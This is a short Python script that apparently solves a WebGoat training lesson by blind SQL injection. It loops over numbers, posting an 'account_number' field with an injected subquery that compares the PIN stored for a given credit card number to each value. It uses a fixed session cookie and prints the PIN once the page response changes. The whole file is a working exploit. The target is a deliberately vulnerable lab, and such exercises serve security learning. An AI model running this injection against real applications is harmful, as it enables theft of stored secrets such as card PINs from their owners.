import requests
from bs4 import BeautifulSoup

url = 'http://webgoat7.com/WebGoat/attack?Screen=586116895&menu=1100'

cookies = {'JSESSIONID':'CD1E27A32598835D2EE5FED6D0725EAD'}

flag = []

for num in range(10000):
	post_data = {'account_number':'101 and (select pin from pins where cc_number=\'1111222233334444\') > %d'%num, 'SUBMIT':'Go!'}

	response = requests.post(url, cookies=cookies, data=post_data)
	html = response.text
	soup = BeautifulSoup(html, 'html.parser')
	
	flag.append(soup.find_all('p')[-1].text)

	if num > 0:
		if flag[num-1] != flag[num]:
			break

print(num)
